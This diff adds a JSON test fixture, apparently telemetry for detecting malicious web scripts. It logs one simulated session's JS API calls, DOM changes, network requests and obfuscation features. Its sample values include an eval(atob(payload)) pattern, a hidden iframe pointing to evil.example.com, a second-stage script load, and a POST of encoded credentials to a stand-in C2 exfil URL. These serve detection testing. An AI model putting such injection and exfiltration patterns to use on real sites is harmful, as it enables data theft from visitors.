@@ -1,0 +1,283 @@
+{
+  "js": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119446,
+      "api_name": "atob",
+      "call_count": 34,
+      "script_source": "at window.atob (<anonymous>:12:5)",
+      "arguments_sample": "dmFyIF9leHBsb2l0PWZ1bmN0aW9u",
+      "url": "https://malicious-site.example.com/payload.js"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119500,
+      "api_name": "eval",
+      "call_count": 89,
+      "script_source": "at window.eval (<anonymous>:43:13)",
+      "arguments_sample": "var _0x1a2b=function(){document.write(...)}",
+      "url": "https://malicious-site.example.com/payload.js"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119600,
+      "api_name": "document.write",
+      "call_count": 12,
+      "script_source": "at HTMLDocument.write (<anonymous>:55:3)",
+      "arguments_sample": "<iframe src='https://evil.example.com/frame'></iframe>",
+      "url": "https://malicious-site.example.com/payload.js"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119700,
+      "api_name": "setTimeout",
+      "call_count": 4,
+      "script_source": "at window.setTimeout (<anonymous>:70:8)",
+      "arguments_sample": "function(){eval(atob(payload))}",
+      "url": "https://malicious-site.example.com/payload.js"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119800,
+      "api_name": "fetch",
+      "call_count": 7,
+      "script_source": "at window.fetch (<anonymous>:80:2)",
+      "arguments_sample": "https://c2-server.example.com/exfil?data=...",
+      "url": "https://malicious-site.example.com/payload.js"
+    }
+  ],
+
+  "dom": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119377,
+      "event_type": "node_added",
+      "node_name": "HTML",
+      "parent_node": "#document",
+      "node_id": null,
+      "node_class": "",
+      "node_attributes": "{\"lang\":\"en\"}",
+      "node_text_length": 120,
+      "node_innerHTML_length": 980,
+      "node_style": "",
+      "is_hidden": false,
+      "dom_depth": 1,
+      "dom_size": 18,
+      "dom_child_count": 1,
+      "url": "https://malicious-site.example.com/"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119620,
+      "event_type": "node_added",
+      "node_name": "IFRAME",
+      "parent_node": "BODY",
+      "node_id": "hidden-frame",
+      "node_class": "hidden",
+      "node_attributes": "{\"src\":\"https://evil.example.com/frame\",\"style\":\"display:none\"}",
+      "node_text_length": 0,
+      "node_innerHTML_length": 0,
+      "node_style": "display:none",
+      "is_hidden": true,
+      "dom_depth": 3,
+      "dom_size": 22,
+      "dom_child_count": 0,
+      "url": "https://malicious-site.example.com/"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119750,
+      "event_type": "attribute_modified",
+      "node_name": "SCRIPT",
+      "parent_node": "HEAD",
+      "node_id": null,
+      "node_class": "",
+      "node_attributes": "{\"src\":\"https://malicious-site.example.com/stage2.js\"}",
+      "node_text_length": 0,
+      "node_innerHTML_length": 0,
+      "node_style": "",
+      "is_hidden": false,
+      "dom_depth": 2,
+      "dom_size": 24,
+      "dom_child_count": 0,
+      "url": "https://malicious-site.example.com/"
+    }
+  ],
+
+  "network": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119145,
+      "request_url": "https://malicious-site.example.com/",
+      "domain": "malicious-site.example.com",
+      "ip_address": "192.0.2.99",
+      "method": "GET",
+      "port": 443,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "referrer": "",
+      "response_code": 200,
+      "content_type": "text/html; charset=utf-8",
+      "request_size": 320,
+      "response_size": 14200,
+      "content_length": 14200,
+      "server": "nginx",
+      "resource_type": "document"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119560,
+      "request_url": "https://malicious-site.example.com/payload.js",
+      "domain": "malicious-site.example.com",
+      "ip_address": "192.0.2.99",
+      "method": "GET",
+      "port": 443,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "referrer": "https://malicious-site.example.com/",
+      "response_code": 200,
+      "content_type": "application/javascript",
+      "request_size": 290,
+      "response_size": 48000,
+      "content_length": 48000,
+      "server": "nginx",
+      "resource_type": "script"
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119810,
+      "request_url": "https://c2-server.example.com/exfil?data=dXNlcjoxMjM=",
+      "domain": "c2-server.example.com",
+      "ip_address": "198.51.100.42",
+      "method": "POST",
+      "port": 443,
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "referrer": "https://malicious-site.example.com/",
+      "response_code": 200,
+      "content_type": "application/json",
+      "request_size": 1024,
+      "response_size": 128,
+      "content_length": 128,
+      "server": "",
+      "resource_type": "fetch"
+    }
+  ],
+
+  "navigation": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119846,
+      "event_type": "navigation_start",
+      "url": "https://malicious-site.example.com/",
+      "page_load_time": 1.23
+    },
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119900,
+      "event_type": "navigation_commit",
+      "url": "https://malicious-site.example.com/",
+      "page_load_time": 1.45
+    }
+  ],
+
+  "script": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119555,
+      "script_length": 48000,
+      "num_lines": 1,
+      "entropy_score": 6.21,
+      "num_functions": 38,
+      "num_eval_calls": 14,
+      "num_comments": 0,
+      "base64_string_count": 7,
+      "hex_string_count": 3,
+      "unicode_escape_count": 12,
+      "num_dynamic_calls": 19,
+      "url": "https://malicious-site.example.com/payload.js",
+      "whitespace_frequency": 0.004,
+      "avg_line_length": 48000.0,
+      "max_line_length": 48000,
+      "character_entropy": 6.21,
+      "character_distribution_ratio": 0.92,
+      "digit_character_ratio": 0.11,
+      "special_character_ratio": 0.48,
+      "html_tag_frequency": 0.002,
+      "html_script_tag_count": 2,
+      "html_iframe_tag_count": 3,
+      "html_form_tag_count": 0,
+      "html_input_tag_count": 0,
+      "url_length": 52,
+      "url_parameter_count": 0,
+      "url_special_character_ratio": 0.12,
+      "url_encoded_character_ratio": 0.0,
+      "url_suspicious_keyword_count": 1,
+      "url_entropy": 5.12
+    }
+  ],
+
+  "obfuscation": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119555,
+      "url": "https://malicious-site.example.com/payload.js",
+      "avg_variable_name_length": 2.1,
+      "variable_name_entropy": 3.8,
+      "function_name_entropy": 4.1,
+      "random_identifier_ratio": 0.72,
+      "short_identifier_ratio": 0.81,
+      "string_splitting_count": 14,
+      "string_concat_operations": 92,
+      "keyword_substitution_count": 6,
+      "encoded_string_ratio": 0.65,
+      "redundant_code_blocks": 3,
+      "dead_code_ratio": 0.12,
+      "control_flow_alterations": 8,
+      "nested_conditionals_count": 11,
+      "conditional_branch_count": 47,
+      "custom_decode_function_count": 2,
+      "base64_decode_usage": 1,
+      "atob_usage": 1,
+      "charcode_decode_usage": 1,
+      "hex_decode_usage": 1,
+      "eval_decoder_patterns": 1
+    }
+  ],
+
+  "token": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240119555,
+      "url": "https://malicious-site.example.com/payload.js",
+      "token_keyword_frequency": 0.018,
+      "token_operator_frequency": 0.071,
+      "token_parentheses_frequency": 0.042,
+      "token_bracket_frequency": 0.021,
+      "token_semicolon_frequency": 0.009,
+      "token_eval_count": 14,
+      "token_document_write_count": 12,
+      "token_innerHTML_count": 5,
+      "token_setTimeout_count": 4,
+      "token_setInterval_count": 2,
+      "token_fetch_count": 7,
+      "token_XMLHttpRequest_count": 0
+    }
+  ],
+
+  "session": [
+    {
+      "session_id": "TEST_SESSION_01",
+      "timestamp": 1773240149328,
+      "url": "https://malicious-site.example.com/",
+      "page_domain": "malicious-site.example.com",
+      "session_duration": 12.44,
+      "total_dom_mutations": 320,
+      "total_js_calls": 89,
+      "total_network_requests": 14,
+      "total_scripts_loaded": 3,
+      "total_iframes": 4,
+      "script_to_dom_ratio": 0.278,
+      "network_to_dom_ratio": 0.044,
+      "eval_to_function_ratio": 0.921,
+      "dynamic_script_ratio": 0.867
+    }
+  ]
+}
